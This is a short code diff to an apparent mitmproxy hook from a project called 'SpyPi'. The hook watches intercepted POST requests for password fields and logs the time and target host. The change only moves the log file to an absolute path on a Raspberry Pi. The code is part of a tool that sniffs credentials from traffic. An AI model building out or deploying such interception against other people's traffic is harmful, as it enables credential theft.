@@ -10,7 +10,7 @@ def request(flow):
     host = flow.request.pretty_host
     method = flow.request.method
     if method == "POST" and ("pass" in content) or ("password" in content) :
-        with open ("proxy.txt", "a") as myfile:
+        with open ("/home/pi/SpyPi/Code/proxy.txt", "a") as myfile:
             myfile.write(farben.AUF + str(now) +" // " + farben.END)
             myfile.write(farben.LD + host + farben.END)
             myfile.write("\n")
